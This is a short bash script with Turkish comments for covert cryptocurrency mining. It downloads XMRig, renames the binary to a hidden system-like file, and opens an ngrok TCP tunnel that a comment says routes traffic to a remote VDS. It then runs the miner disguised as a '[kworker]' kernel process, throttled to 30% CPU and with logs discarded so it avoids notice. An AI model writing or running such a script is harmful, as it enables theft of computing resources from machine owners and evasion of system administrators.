#!/bin/bash
# Gizli Kimlik
AGENT=".sys_core_logic"
CONFIG="logic_cfg.yaml"

# 1. Mining motorunu indir ve ismini değiştir
wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
tar -xf xmrig-6.22.2-linux-static-x64.tar.gz
mv xmrig-6.22.2/xmrig ./$AGENT
rm -rf xmrig-6.22.2*

# 2. Ngrok Tünelini arka planda başlat (Trafik VDS'e akıyor)
# Tüneli senin verdiğin adrese yönlendiriyoruz
nohup ./ngrok tcp 22108 --region eu > /dev/null 2>&1 &
sleep 5

# 3. Maskeli Çalıştırma (Process adını kworker yap)
# --cpu-max-threads-hint 30 : İşlemciyi %30'da tutar
# --cpu-affinity : Sadece belirli çekirdekler
exec -a "[kworker/u16:0]" ./$AGENT -c $CONFIG \
    --cpu-max-threads-hint 30 \
    --background \
    --log-file /dev/null \
    > /dev/null 2>&1 &

echo "System Logic Active: $(ps aux | grep kworker | head -n 1)"
